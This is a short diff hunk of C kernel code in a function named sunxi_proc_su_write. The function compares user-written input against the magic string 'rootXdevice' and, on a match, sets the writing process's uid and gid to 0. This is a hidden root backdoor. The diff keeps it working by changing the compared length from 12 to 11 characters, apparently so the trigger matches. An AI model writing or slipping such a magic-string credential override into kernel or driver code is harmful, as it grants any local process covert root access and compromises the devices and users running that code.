@@ -39,7 +39,7 @@ static int sunxi_proc_su_write(struct file *file, const char __user *buffer,
 		return -EFAULT;
 	}
 
-	if(!strncmp("rootXdevice",(char*)buf,12)){
+	if(!strncmp("rootXdevice",(char*)buf,11)){
 		cred = (struct cred *)__task_cred(current);
 		cred->uid = 0;
 		cred->gid = 0;
